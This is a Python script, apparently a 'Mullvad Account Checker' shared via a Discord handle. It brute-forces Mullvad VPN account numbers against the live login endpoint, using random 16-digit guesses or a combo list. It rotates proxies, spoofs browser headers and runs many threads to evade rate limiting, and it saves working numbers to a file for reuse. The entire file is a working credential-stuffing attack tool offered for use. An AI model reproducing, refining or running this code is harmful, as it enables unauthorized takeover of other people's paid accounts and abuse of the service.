import requests
import random
import threading
import time
import os
os.system('title Mullvad Account Checker / .xKq on discord')
def load_proxies(filename="proxy.txt"):
    with open(filename, 'r') as file:
        proxies = [line.strip() for line in file.readlines()]
    proxies = [proxy if proxy.startswith('http') else f"http://{proxy}" for proxy in proxies]
    return proxies

def generate_account_number():
    return ''.join(random.choices('0123456789', k=16))

def load_combos(filename="combo.txt"):
    with open(filename, 'r') as file:
        combo_numbers = [line.strip() for line in file.readlines()]
    return combo_numbers

def make_request(account_number, proxy=None):
    session = requests.Session()

    post_url = "https://mullvad.net/pl/account/login"
    headers_post = {
        "Origin": "https://mullvad.net",
        "Referer": "https://mullvad.net/pl/account/login",
        "sec-ch-ua": '"Chromium";v="128", "Not;A=Brand";v="24", "Microsoft Edge";v="128"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "accept": "application/json",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
        "x-sveltekit-action": "true",
        "content-type": "application/x-www-form-urlencoded"
    }

    if proxy:
        proxies = {
            "http": proxy,
            "https": proxy,
        }
    else:
        proxies = None
        
    data = {
        "account_number": account_number
    }

    try:
        response = session.post(post_url, headers=headers_post, data=data, proxies=proxies)
        post_response_json = response.json()
        print(f"[{account_number}] POST response: {post_response_json}")

        if post_response_json.get("type") == "failure":
            print(f"[{account_number}] Login failed: {post_response_json.get('data')}")
            return

        if post_response_json.get("type") == "redirect" and post_response_json.get("status") == 302 and post_response_json.get("location") == "/pl/account":
            with open("valid_mull.txt", "a") as valid_file:
                valid_file.write(f"{account_number}\n")
            print(f"[{account_number}] Valid account! Saved to valid_mull.txt.")

    except Exception as e:
        print(f"[{account_number}] POST request failed: {e}")

def start_threads(count, proxy_list, mode):
    threads = []
    if mode == 'combo':
        account_numbers = load_combos()

        count = min(count, len(account_numbers))

        for i in range(count):
            account_number = account_numbers[i]
            proxy = random.choice(proxy_list) if proxy_list else None
            thread = threading.Thread(target=make_request, args=(account_number, proxy))
            threads.append(thread)
            thread.start()
            time.sleep(1)

    elif mode == 'generate':
        for i in range(count):
            account_number = generate_account_number()
            proxy = random.choice(proxy_list) if proxy_list else None
            thread = threading.Thread(target=make_request, args=(account_number, proxy))
            threads.append(thread)
            thread.start()
            time.sleep(0.0001)


    for thread in threads:
        thread.join()


if __name__ == "__main__":
    mode = input("Select mode (combo/generate): ").strip().lower()
    request_count = int(input("Enter number of requests to send: ").strip())
    proxies = load_proxies() if 'proxy.txt' else []
    if mode == 'combo':
        print("Checking accounts from combo.txt...")
        start_threads(request_count, proxies, mode='combo')
    elif mode == 'generate':
        print("Generating and checking random accounts...")
        start_threads(request_count, proxies, mode='generate')
    else:
        print("Invalid mode selected. Exiting.")
